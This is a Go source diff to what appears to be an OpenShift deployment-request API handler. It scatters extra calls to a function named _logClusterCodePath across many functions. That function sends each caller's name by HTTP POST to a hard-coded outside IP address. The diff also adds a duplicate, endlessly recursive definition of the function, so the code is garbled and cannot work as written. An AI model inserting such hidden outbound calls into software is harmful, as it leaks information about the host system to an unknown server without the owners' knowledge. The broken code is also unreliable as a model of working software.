@@ -47,6 +47,8 @@ func NewREST(store registry.Store, imagesclient imageclientinternal.Interface, k
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	store.UpdateStrategy = Strategy
 	return &REST{store: &store, is: imagesclient.Image(), rn: kc.CoreV1(), admit: admission}
 }
@@ -75,9 +77,13 @@ func (s *REST) New() runtime.Object {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &appsapi.DeploymentRequest{}
 }
 func (s *REST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -146,6 +152,8 @@ func (s *REST) Create(ctx context.Context, obj runtime.Object, createValidation 
 	return ret, err
 }
 func processTriggers(config *appsapi.DeploymentConfig, is images.ImageStreamsGetter, force bool, exclude []appsapi.DeploymentTriggerType) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -229,6 +237,8 @@ func containsTriggerType(types []appsapi.DeploymentTriggerType, triggerType apps
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, t := range types {
 		if t == triggerType {
 			return true
@@ -237,6 +247,8 @@ func containsTriggerType(types []appsapi.DeploymentTriggerType, triggerType apps
 	return false
 }
 func canTrigger(config *appsapi.DeploymentConfig, rn corev1client.ReplicationControllersGetter, force bool) (bool, []appsapi.DeploymentCause, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -311,6 +323,8 @@ func decodeFromLatestDeployment(config *appsapi.DeploymentConfig, rn corev1clien
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if config.Status.LatestVersion == 0 {
 		return config, nil
 	}
@@ -334,6 +348,8 @@ func decodeFromLatestDeployment(config *appsapi.DeploymentConfig, rn corev1clien
 	return internalConfig, nil
 }
 func hasUpdatedTriggers(current, previous appsapi.DeploymentConfig) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -383,6 +399,8 @@ func triggeredByDifferentImage(ictParams appsapi.DeploymentTriggerImageChangePar
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, t := range previous.Spec.Triggers {
 		if t.Type != appsapi.DeploymentTriggerOnImageChange {
 			continue
@@ -413,6 +431,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -487,5 +526,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
